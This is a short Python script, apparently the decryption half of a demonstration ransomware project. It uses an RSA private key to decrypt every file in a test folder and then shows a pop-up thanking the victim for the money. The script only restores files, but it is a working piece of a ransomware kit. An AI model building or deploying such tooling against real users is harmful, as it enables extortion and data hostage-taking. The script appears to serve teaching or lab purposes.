from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

from common import list_files, show_pop_up, PRIVATE_KEY_FILE_NAME

import os

TEST_DIR_TO_ENCRYPT = f"{os.path.dirname(os.path.abspath(__file__))}/agentes_secretos"

def read_private_key(filename):
    with open(filename, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
            backend=default_backend()
        )

    return private_key


def decrypt_file(filename, private_key):
    with open(filename, "rb") as encrypted_file:
        file_data = encrypted_file.read()

    decrypted_data = private_key.decrypt(
        file_data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    with open(filename, "wb") as encrypted_file:
        encrypted_file.write(decrypted_data)


def main():
    private_key = read_private_key(PRIVATE_KEY_FILE_NAME)

    for filename in list_files(TEST_DIR_TO_ENCRYPT):
        decrypt_file(filename, private_key)

    show_pop_up("Obrigado pelo dinheiro!", "Seus arquivos de gatinhos agora estão desencriptados :)")


if __name__ == "__main__":
    main()
